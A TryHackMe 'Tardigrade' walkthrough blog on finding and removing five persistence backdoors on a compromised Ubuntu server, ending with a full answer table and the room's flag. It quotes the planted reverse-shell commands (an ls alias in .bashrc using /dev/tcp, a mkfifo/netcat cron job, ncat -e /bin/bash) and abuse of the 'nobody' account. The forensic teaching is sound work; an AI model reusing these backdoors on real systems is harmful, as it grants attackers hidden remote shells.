---
title: 'TryHackMe: Tardigrade'
date: 2026-03-15T20:53:00
draft: false
tags:
  - tryhackme
  - walkthrough
  - cybersecurity
  - blog
  - ku5e
  - persistence
  - backdoors
  - incident-response
  - linux-forensics
description: TryHackMe Tardigrade walkthrough. Five persistence mechanisms on a compromised Linux server, from bashrc alias hijacking to abused system accounts.
cover:
  image: /images/tardigrade.png
  alt: ''
  caption: ''
  relative: false
---

**Author:** Mario Martinez Jr. (ku5e / Gary7) | TryHackMe USA Top 1%
**Difficulty:** Easy
**Topics:** Persistence Mechanisms, Backdoors, Incident Response, Linux Forensics

***

Answers are redacted within the narrative to allow you to complete the tasks on your own, but a full table of answers is available at the end of this walkthrough.

A server is already compromised. The attacker believes they cleared out. Your job is finding what they left behind before the machine goes back to production. The IR team has isolated the machine and handed you credentials for an account with root privileges. Five backdoors are planted somewhere on the system. Finding them requires knowing what a clean Linux install looks like. Anything that doesn't match is a lead.

***

## Task 1: Connect to the Machine via SSH

The credentials provided are giorgio:armani. The weak password is worth noting on the way in. In most real compromises the initial access vector is a guessable credential or a reused password, not a sophisticated exploit chain. Giorgio's password is the kind that ends up in a breach database.

Connect via SSH:

```plain
ssh giorgio@<TARGET_IP>

```

Check the OS version:

```plain
cat /etc/os-release

```

The server is running **[REDACTED]**.

***

## Task 2: Investigating the giorgio Account

Start in the home directory and list everything, including hidden files:

```plain
ls -la ~

```

The most interesting file here is **[REDACTED]**. The name does not hide what it is. An attacker who plants something with that label is either careless or confident nobody will look. It surfaces immediately.

### Technical Deep Dive: .bashrc Alias Hijacking

The `.bashrc` file executes every time an interactive shell opens, automatically, before the user does anything. Inside giorgio's `.bashrc` is this:

```plain
ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'

```

Every time giorgio runs `ls`, a reverse shell fires to 172.10.6.9 on port 6969. It runs in the background via `disown`, detaching from the terminal entirely. The real `ls` executes after with `--color=auto`. From the user's perspective, the command behaves normally. That is the mechanism: make it work exactly as expected so nothing surfaces as broken. The answer to the `.bashrc` question is **[REDACTED]**.

### Scheduled Tasks

Check cron jobs owned by the current user:

```plain
crontab -l

```

The scheduled task found is **[REDACTED]**. It uses `mkfifo` to create a named pipe and routes shell I/O through netcat, a reliable technique for environments where a standard reverse shell won't bind cleanly.

***

## Task 4: Investigating the root Account

Switch to root and watch the terminal:

```plain
sudo su

```

Seconds after the shell initializes, an error appears without any input:

**[REDACTED]**

The attacker's listener isn't running, so the outbound connection attempt fails and the error surfaces in the terminal. The command responsible is **[REDACTED]**, using `ncat` with the `-e` flag to hand `/bin/bash` directly to the attacker's IP on connection.

The mechanism is **[REDACTED]**. Same approach as the giorgio account. The root `.bashrc` fired the ncat command the moment the shell initialized. Elevated privilege, same technique.

***

## Task 5: Investigating the System

Four backdoors are documented. The fifth takes a different approach to find. There is no unusual filename and no cron job to list. The room gives one direction: look for what doesn't belong.

Every fresh Linux install ships with a set of default system accounts that handle background processes. These accounts are not meant for interactive login. One of them has been modified.

```plain
cat /etc/passwd

```

Work through the output and apply the Sesame Street test: which one of these things is not like the others. The fifth persistence mechanism is **[REDACTED]**, a system account present on every Linux install, intended to stay locked and inert. On this system it was given a shell and credentials. The `/etc/passwd` entry will look almost right. Almost.

***

## Task 6: Final Thoughts

Remediation for the first four backdoors is direct: delete the suspicious file, remove the malicious aliases from both `.bashrc` files, and clear the cron job. The fifth requires restoring the system account to its default state. The account needs to exist. Its shell gets set back to `/usr/sbin/nologin` and any credentials are stripped.

The attacker left one final item somewhere on the system. The golden nugget is **[REDACTED]**.

***

## Final Flag Summary Table

| **Task** | **Category/Question** | **Flag/Answer** |
| --- | --- | --- |
| **1** | Server OS version | Ubuntu 20.04.6 LTS |
| **2** | Most interesting file in giorgio's home directory | .bad_bash |
| **2** | Interesting content in giorgio's .bashrc | `ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'` |
| **2** | Interesting scheduled task | \`/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f |
| **4** | Error message on root login | Ncat: TIMEOUT. |
| **4** | Suspicious command in error message | `ncat -e /bin/bash 172.10.6.9 6969` |
| **4** | How the command was implemented | .bashrc |
| **5** | Last persistence mechanism | nobody |
| **6** | The nugget | THM{Nob0dy_1s_s@f3} |

***

Written by Mario Martinez Jr. (ku5e / Gary7) | [TryHackMe Profile](https://tryhackme.com/p/ku5e) | [ku5e.com/blog](https://ku5e.com/blog)
